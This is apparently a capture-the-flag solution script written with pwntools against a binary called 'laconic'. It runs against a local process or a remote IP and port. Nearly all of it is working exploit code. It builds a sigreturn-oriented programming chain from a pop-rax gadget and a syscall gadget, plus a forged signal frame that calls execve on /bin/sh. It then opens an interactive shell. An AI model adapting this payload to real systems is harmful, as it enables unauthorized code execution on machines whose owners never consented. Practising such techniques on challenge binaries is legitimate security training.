from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./laconic")

def start():
    if args.REMOTE:
        return remote("94.237.61.252", 54225)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

pop_rax = 0x0000000000043018 # pop rax ; ret
syscall = 0x0000000000043015 # syscall
bin_sh_addr = 0x43238 # /bin/sh*

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve()
frame.rdi = bin_sh_addr           # pointer to "/bin/sh"
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = syscall         # `syscall` gadget
print(bytes(frame))  # b'\x00\x00\x00\x00\x00\x00\x00\x00...' (248 bytes)

# Esto activa el sigreturn
payload = b"".join([
    b"A"*8,
    p64(pop_rax),
    p64(0xf),
    p64(syscall),
    bytes(frame)
])

io.send(payload)

io.interactive()